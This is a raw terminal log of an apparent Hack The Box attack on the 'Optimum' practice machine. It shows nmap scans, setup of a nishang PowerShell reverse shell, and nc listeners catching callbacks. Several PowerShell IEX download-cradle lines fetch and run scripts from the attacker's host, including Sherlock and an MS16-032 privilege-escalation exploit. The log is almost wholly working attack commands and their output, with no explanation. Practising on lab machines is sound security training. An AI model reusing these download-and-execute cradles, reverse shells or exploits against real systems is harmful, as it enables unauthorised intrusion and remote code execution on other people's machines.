@@ -1,0 +1,440 @@
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ nmap -sC -sV -oA nmap/initial 10.10.10.8                      
+Failed to open normal output file nmap/initial.nmap for writing                                                   
+QUITTING!                   
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ mkdir nmap                                                    
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ sudo nmap -sC -sV -oA nmap/initial 10.10.10.8                 
+[sudo] password for arjun:  
+Sorry, try again.           
+[sudo] password for arjun:  
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-13 13:35 CDT                                                   
+Nmap scan report for 10.10.10.8                          
+Host is up (0.043s latency).                             
+Not shown: 999 filtered ports                            
+PORT   STATE SERVICE VERSION                             
+80/tcp open  http    HttpFileServer httpd 2.3            
+|_http-server-header: HFS 2.3                            
+|_http-title: HFS /         
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                    
+Nmap done: 1 IP address (1 host up) scanned in 14.35 seconds                                                      
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ sudo nmap -T4 -p- nmap/allports 10.10.10.8                    
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-13 13:36 CDT                                                   
+Unable to split netmask from target expression: "nmap/allports"                                                   
+
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ sudo nmap -T4 -p- -oA nmap/allports 10.10.10.8                
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-13 13:36 CDT                                                   
+Nmap scan report for 10.10.10.8                          
+Host is up (0.044s latency).                             
+Not shown: 65534 filtered ports                          
+PORT   STATE SERVICE        
+80/tcp open  http           
+
+Nmap done: 1 IP address (1 host up) scanned in 88.75 seconds                                                      
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ searchsploit httpfileserver                                   
+Exploits: No Result         
+Shellcodes: No Result       
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ cd /opt/shell/                                                
+arjun@broly:/opt/shell$ ls  
+php  python  setuid.c       
+arjun@broly:/opt/shell$ mkdir powershell                 
+mkdir: cannot create directory ‘powershell’: Permission denied                                                    
+arjun@broly:/opt/shell$ sudo mkdir powershell            
+[sudo] password for arjun:  
+arjun@broly:/opt/shell$ cd powershell/                   
+arjun@broly:/opt/shell/powershell$ git clone https://github.com/samratashok/nishang                               
+fatal: could not create work tree dir 'nishang': Permission denied                                                
+arjun@broly:/opt/shell/powershell$ sudo git clone https://github.com/samratashok/nishang                          
+Cloning into 'nishang'...   
+remote: Enumerating objects: 15, done.                   
+remote: Counting objects: 100% (15/15), done.            
+remote: Compressing objects: 100% (13/13), done.         
+remote: Total 1691 (delta 4), reused 6 (delta 2), pack-reused 1676                                                
+Receiving objects: 100% (1691/1691), 7.84 MiB | 7.93 MiB/s, done.                                                 
+Resolving deltas: 100% (1055/1055), done.                
+arjun@broly:/opt/shell/powershell$ cd ~/Documents/HacktheBox/retired/optimum/                                     
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ cp /opt/shell/powershell/nishang/                             
+ActiveDirectory/ CHANGELOG.txt    Execution/       .gitignore       nishang.psm1     README.md                    
+Antak-WebShell/  Client/          Gather/          LICENSE          Pivot/           Scan/                        
+Backdoors/       DISCLAIMER.txt   .git/            Misc/            powerpreter/     Shells/                      
+Bypass/          Escalation/      .gitattributes   MITM/            Prasadhak/       Utility/                     
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ cp /opt/shell/powershell/nishang/Shells/                      
+Invoke-ConPtyShell.ps1               Invoke-PowerShellIcmp.ps1            Invoke-PowerShellUdp.ps1                
+Invoke-JSRatRegsvr.ps1               Invoke-PowerShellTcpOneLineBind.ps1  Invoke-PowerShellWmi.ps1                
+Invoke-JSRatRundll.ps1               Invoke-PowerShellTcpOneLine.ps1      Invoke-PsGcatAgent.ps1                  
+Invoke-PoshRatHttp.ps1               Invoke-PowerShellTcp.ps1             Invoke-PsGcat.ps1                       
+Invoke-PoshRatHttps.ps1              Invoke-PowerShellUdpOneLine.ps1      Remove-PoshRat.ps1                      
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ cp /opt/shell/powershell/nishang/Shells/                      
+Invoke-ConPtyShell.ps1               Invoke-PowerShellIcmp.ps1            Invoke-PowerShellUdp.ps1                
+Invoke-JSRatRegsvr.ps1               Invoke-PowerShellTcpOneLineBind.ps1  Invoke-PowerShellWmi.ps1                
+Invoke-JSRatRundll.ps1               Invoke-PowerShellTcpOneLine.ps1      Invoke-PsGcatAgent.ps1                  
+Invoke-PoshRatHttp.ps1               Invoke-PowerShellTcp.ps1             Invoke-PsGcat.ps1                       
+Invoke-PoshRatHttps.ps1              Invoke-PowerShellUdpOneLine.ps1      Remove-PoshRat.ps1                      
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ cp /opt/shell/powershell/nishang/Shells/                      
+Invoke-ConPtyShell.ps1               Invoke-PowerShellIcmp.ps1            Invoke-PowerShellUdp.ps1                
+Invoke-JSRatRegsvr.ps1               Invoke-PowerShellTcpOneLineBind.ps1  Invoke-PowerShellWmi.ps1                
+Invoke-JSRatRundll.ps1               Invoke-PowerShellTcpOneLine.ps1      Invoke-PsGcatAgent.ps1                  
+Invoke-PoshRatHttp.ps1               Invoke-PowerShellTcp.ps1             Invoke-PsGcat.ps1                       
+Invoke-PoshRatHttps.ps1              Invoke-PowerShellUdpOneLine.ps1      Remove-PoshRat.ps1                      
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ cp /opt/shell/powershell/nishang/Shells/Invoke-PowerShellTcp  
+Invoke-PowerShellTcpOneLineBind.ps1  Invoke-PowerShellTcpOneLine.ps1      Invoke-PowerShellTcp.ps1                
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ cp /opt/shell/powershell/nishang/Shells/Invoke-PowerShellTcp  
+Invoke-PowerShellTcpOneLineBind.ps1  Invoke-PowerShellTcpOneLine.ps1      Invoke-PowerShellTcp.ps1                
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ cp /opt/shell/powershell/nishang/Shells/Invoke-PowerShellTcp.ps1 .                        
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ ls   
+Invoke-PowerShellTcp.ps1  nmap  notes.ctb  notes.ctb~  notes.ctb~~  notes.ctb~~~                                  
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ vim Invoke-PowerShellTcp.ps1                                  
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ nc -lvnp 9001                                                 
+listening on [any] 9001 ... 
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.8] 49174                                                        
+Windows PowerShell running as user kostas on OPTIMUM     
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.                                                    
+
+PS C:\Users\kostas\Desktop>dir                           
+
+
+    Directory: C:\Users\kostas\Desktop                   
+
+
+Mode                LastWriteTime     Length Name                                                                 
+----                -------------     ------ ----                                                                 
+-a---         18/3/2017   2:11 ??     760320 hfs.exe                                                              
+-ar--         18/3/2017   2:13 ??         32 user.txt.txt                                                         
+
+
+PS C:\Users\kostas\Desktop> whoami                       
+optimum\kostas              
+PS C:\Users\kostas\Desktop> whoami                       
+optimum\kostas              
+PS C:\Users\kostas\Desktop> type user.txt.txt            
+d0c39409d7b994a9a1389ebf38ef5f73                         
+PS C:\Users\kostas\Desktop> sysinfo                      
+d0c39409d7b994a9a1389ebf38ef5f73                         
+PS C:\Users\kostas\Desktop> Invoke-PowerShellTcp : The term 'sysinfo' is not recognized as the name of a cm       
+dlet, function, script file, or operable program. Check the spelling of the nam                                   
+e, or if a path was included, verify that the path is correct and try again.                                      
+At line:127 char:1          
++ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 9001                                                 
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                 
+    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep                                    
+   tion                     
+    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio                                    
+   n,Invoke-PowerShellTcp   
+                            
+systeminfo                  
+^C                          
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ nc -lvnp 9001                                                 
+listening on [any] 9001 ... 
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.8] 49198                                                        
+Windows PowerShell running as user kostas on OPTIMUM     
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.                                                    
+
+PS C:\Users\kostas\Desktop>systeminfo                    
+
+Host Name:                 OPTIMUM                       
+OS Name:                   Microsoft Windows Server 2012 R2 Standard                                              
+OS Version:                6.3.9600 N/A Build 9600       
+OS Manufacturer:           Microsoft Corporation         
+OS Configuration:          Standalone Server             
+OS Build Type:             Multiprocessor Free           
+Registered Owner:          Windows User                  
+Registered Organization:    
+Product ID:                00252-70000-00000-AA535       
+Original Install Date:     18/3/2017, 1:51:36 ??         
+System Boot Time:          20/5/2020, 6:18:57 ??         
+System Manufacturer:       VMware, Inc.                  
+System Model:              VMware Virtual Platform       
+System Type:               x64-based PC                  
+Processor(s):              1 Processor(s) Installed.     
+                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz                        
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018                                              
+Windows Directory:         C:\Windows                    
+System Directory:          C:\Windows\system32           
+Boot Device:               \Device\HarddiskVolume1       
+System Locale:             el;Greek                      
+Input Locale:              en-us;English (United States) 
+Time Zone:                 (UTC+02:00) Athens, Bucharest 
+Total Physical Memory:     4.095 MB                      
+Available Physical Memory: 3.405 MB                      
+Virtual Memory: Max Size:  5.503 MB                      
+Virtual Memory: Available: 4.851 MB                      
+Virtual Memory: In Use:    652 MB                        
+Page File Location(s):     C:\pagefile.sys               
+Domain:                    HTB                           
+Logon Server:              \\OPTIMUM                     
+Hotfix(s):                 31 Hotfix(s) Installed.       
+                           [01]: KB2959936               
+                           [02]: KB2896496               
+                           [03]: KB2919355               
+                           [04]: KB2920189               
+                           [05]: KB2928120               
+                           [06]: KB2931358               
+                           [07]: KB2931366               
+                           [08]: KB2933826               
+                           [09]: KB2938772               
+                           [10]: KB2949621               
+                           [11]: KB2954879               
+                           [12]: KB2958262               
+                           [13]: KB2958263               
+                           [14]: KB2961072               
+                           [15]: KB2965500               
+                           [16]: KB2966407               
+                           [17]: KB2967917               
+                           [18]: KB2971203               
+                           [19]: KB2971850               
+                           [20]: KB2973351               
+                           [21]: KB2973448               
+                           [22]: KB2975061               
+                           [23]: KB2976627               
+                           [24]: KB2977629               
+                           [25]: KB2981580               
+                           [26]: KB2987107               
+                           [27]: KB2989647               
+                           [28]: KB2998527               
+                           [29]: KB3000850               
+                           [30]: KB3003057               
+                           [31]: KB3014442               
+Network Card(s):           1 NIC(s) Installed.           
+                           [01]: Intel(R) 82574L Gigabit Network Connection                                       
+                                 Connection Name: Ethernet0                                                       
+                                 DHCP Enabled:    No     
+                                 IP address(es)          
+                                 [01]: 10.10.10.8        
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.   
+PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16:8000/Sherlock.ps1')  
+
+
+Title      : User Mode to Ring (KiTrap0D)                
+MSBulletin : MS10-015       
+CVEID      : 2010-0232      
+Link       : https://www.exploit-db.com/exploits/11199/  
+VulnStatus : Not supported on 64-bit systems             
+
+Title      : Task Scheduler .XML                         
+MSBulletin : MS10-092       
+CVEID      : 2010-3338, 2010-3888                        
+Link       : https://www.exploit-db.com/exploits/19930/  
+VulnStatus : Not Vulnerable 
+
+Title      : NTUserMessageCall Win32k Kernel Pool Overflow                                                        
+MSBulletin : MS13-053       
+CVEID      : 2013-1300      
+Link       : https://www.exploit-db.com/exploits/33213/  
+VulnStatus : Not supported on 64-bit systems             
+
+Title      : TrackPopupMenuEx Win32k NULL Page           
+MSBulletin : MS13-081       
+CVEID      : 2013-3881      
+Link       : https://www.exploit-db.com/exploits/31576/  
+VulnStatus : Not supported on 64-bit systems             
+
+Title      : TrackPopupMenu Win32k Null Pointer Dereference                                                       
+MSBulletin : MS14-058       
+CVEID      : 2014-4113      
+Link       : https://www.exploit-db.com/exploits/35101/  
+VulnStatus : Not Vulnerable 
+
+Title      : ClientCopyImage Win32k                      
+MSBulletin : MS15-051       
+CVEID      : 2015-1701, 2015-2433                        
+Link       : https://www.exploit-db.com/exploits/37367/  
+VulnStatus : Not Vulnerable 
+
+Title      : Font Driver Buffer Overflow                 
+MSBulletin : MS15-078       
+CVEID      : 2015-2426, 2015-2433                        
+Link       : https://www.exploit-db.com/exploits/38222/  
+VulnStatus : Not Vulnerable 
+
+Title      : 'mrxdav.sys' WebDAV                         
+MSBulletin : MS16-016       
+CVEID      : 2016-0051      
+Link       : https://www.exploit-db.com/exploits/40085/  
+VulnStatus : Not supported on 64-bit systems             
+
+Title      : Secondary Logon Handle                      
+MSBulletin : MS16-032       
+CVEID      : 2016-0099      
+Link       : https://www.exploit-db.com/exploits/39719/  
+VulnStatus : Appears Vulnerable                          
+
+Title      : Windows Kernel-Mode Drivers EoP             
+MSBulletin : MS16-034       
+CVEID      : 2016-0093/94/95/96                          
+Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1                                   
+             6-034?         
+VulnStatus : Appears Vulnerable                          
+
+Title      : Win32k Elevation of Privilege               
+MSBulletin : MS16-135       
+CVEID      : 2016-7255      
+Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S                                   
+             ample-Exploits/MS16-135                     
+VulnStatus : Appears Vulnerable                          
+
+Title      : Nessus Agent 6.6.2 - 6.10.3                 
+MSBulletin : N/A            
+CVEID      : 2017-7199      
+Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h                                   
+             tml            
+VulnStatus : Not Vulnerable 
+
+
+
+PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16:8000/shell.ps1')     
+PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16:8000/Invoke-PowerShellTcp.ps1')                  
+PS C:\Users\kostas\Desktop> Invoke-PowerShellTcp : Exception calling ".ctor" with "2" argument(s): "No conn       
+ection could be made because the target machine actively refused it 10.10.14.16                                   
+:9001"                      
+At line:127 char:1          
++ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 9001                                                 
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                 
+    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep                                    
+   tion                     
+    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio                                    
+   n,Invoke-PowerShellTcp   
+                            
+^C                          
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ nc -lvnp 9001                                                 
+listening on [any] 9001 ... 
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.8] 49233                                                        
+Windows PowerShell running as user kostas on OPTIMUM     
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.                                                    
+
+PS C:\Users\kostas\Desktop>IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16:8000/Invoke-MS16032.ps1')                         
+     __ __ ___ ___   ___     ___ ___ ___                 
+    |  V  |  _|_  | |  _|___|   |_  |_  |                
+    |     |_  |_| |_| . |___| | |_  |  _|                
+    |_|_|_|___|_____|___|   |___|___|___|                
+                                                         
+                   [by b33f -> @FuzzySec]                
+
+[!] Holy handle leak Batman, we have a SYSTEM shell!!    
+
+PS C:\Users\kostas\Desktop> whoami                       
+optimum\kostas              
+PS C:\Users\kostas\Desktop> exit                         
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ nc -lvnp 9001                                                 
+listening on [any] 9001 ... 
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.8] 49241                                                        
+Windows PowerShell running as user kostas on OPTIMUM     
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.                                                    
+
+PS C:\Users\kostas\Desktop>IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16:8000/Invoke-MS16032.ps1')                         
+     __ __ ___ ___   ___     ___ ___ ___                 
+    |  V  |  _|_  | |  _|___|   |_  |_  |                
+    |     |_  |_| |_| . |___| | |_  |  _|                
+    |_|_|_|___|_____|___|   |___|___|___|                
+                                                         
+                   [by b33f -> @FuzzySec]                
+
+[!] Holy handle leak Batman, we have a SYSTEM shell!!    
+
+PS C:\Users\kostas\Desktop> ls                           
+
+
+    Directory: C:\Users\kostas\Desktop                   
+
+
+Mode                LastWriteTime     Length Name                                                                 
+----                -------------     ------ ----                                                                 
+-a---         18/3/2017   2:11 ??     760320 hfs.exe                                                              
+-a---         20/5/2020   7:25 ??    1163893 powerup.ps1                                                          
+-ar--         18/3/2017   2:13 ??         32 user.txt.txt                                                         
+-a---         20/5/2020   7:29 ??      96957 winPEAS.exe                                                          
+
+
+PS C:\Users\kostas\Desktop> whoami                       
+optimum\kostas              
+PS C:\Users\kostas\Desktop> :q                           
+optimum\kostas              
+PS C:\Users\kostas\Desktop> Invoke-PowerShellTcp : The term ':q' is not recognized as the name of a cmdlet,       
+ function, script file, or operable program. Check the spelling of the name, or                                   
+ if a path was included, verify that the path is correct and try again.                                           
+At line:127 char:1          
++ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 9001                                                 
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                 
+    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep                                    
+   tion                     
+    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio                                    
+   n,Invoke-PowerShellTcp   
+                            
+^C                          
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ nc -lvnp 9001                                                 
+listening on [any] 9001 ... 
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.8] 49258                                                        
+Windows PowerShell running as user kostas on OPTIMUM     
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.                                                    
+
+PS C:\Users\kostas\Desktop>IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7:8000/shell.ps1')       
+PS C:\Users\kostas\Desktop> Invoke-PowerShellTcp : Exception calling "DownloadString" with "1" argument(s):       
+ "Unable to connect to the remote server"                
+At line:127 char:1          
++ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 9001                                                 
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                 
+    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep                                    
+   tion                     
+    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio                                    
+   n,Invoke-PowerShellTcp   
+                            
+^C                          
+arjun@broly:~/Documents/HacktheBox/retired/optimum$      
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ nc -lvnp 9001                                                 
+listening on [any] 9001 ... 
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.8] 49267                                                        
+Windows PowerShell running as user kostas on OPTIMUM     
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.                                                    
+
+PS C:\Users\kostas\Desktop>IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16:8000/shell.ps1')      
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ nc -lvnp 9001                                                 
+listening on [any] 9001 ... 
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.8] 49281                                                        
+Windows PowerShell running as user kostas on OPTIMUM     
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.                                                    
+
+PS C:\Users\kostas\Desktop>IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16:8000/Invoke-MS16032.ps1')                         
+     __ __ ___ ___   ___     ___ ___ ___                 
+    |  V  |  _|_  | |  _|___|   |_  |_  |                
+    |     |_  |_| |_| . |___| | |_  |  _|                
+    |_|_|_|___|_____|___|   |___|___|___|                
+                                                         
+                   [by b33f -> @FuzzySec]                
+
+[!] Holy handle leak Batman, we have a SYSTEM shell!!    
+
+PS C:\Users\kostas\Desktop>                              
+PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16:8000/Invoke-MS16032.ps1')                        
+     __ __ ___ ___   ___     ___ ___ ___                 
+    |  V  |  _|_  | |  _|___|   |_  |_  |                
+    |     |_  |_| |_| . |___| | |_  |  _|                
+    |_|_|_|___|_____|___|   |___|___|___|                
+                                                         
+                   [by b33f -> @FuzzySec]                
+
+[!] Holy handle leak Batman, we have a SYSTEM shell!!    
+
+PS C:\Users\kostas\Desktop> Invoke-MS16032               
+
+ls                          
+dir                         
+^C                          
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ nc -lvnp 9001                                                 
+listening on [any] 9001 ... 
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.8] 49292                                                        
+Windows PowerShell running as user kostas on OPTIMUM     
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.                                                    
+
+PS C:\Users\kostas\Desktop>IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16:8000/Invoke-MS16032.ps1')                         
+     __ __ ___ ___   ___     ___ ___ ___                 
+    |  V  |  _|_  | |  _|___|   |_  |_  |                
+    |     |_  |_| |_| . |___| | |_  |  _|                
+    |_|_|_|___|_____|___|   |___|___|___|                
+                                                         
+                   [by b33f -> @FuzzySec]                
+
+[!] Holy handle leak Batman, we have a SYSTEM shell!!    
+
+PS C:\Users\kostas\Desktop> exit                         
+arjun@broly:~/Documents/HacktheBox/retired/optimum$ sudo msfconsole                                               
+[sudo] password for arjun:  
+arjun@broly:~/Documents/HacktheBox/retired/optimum$      
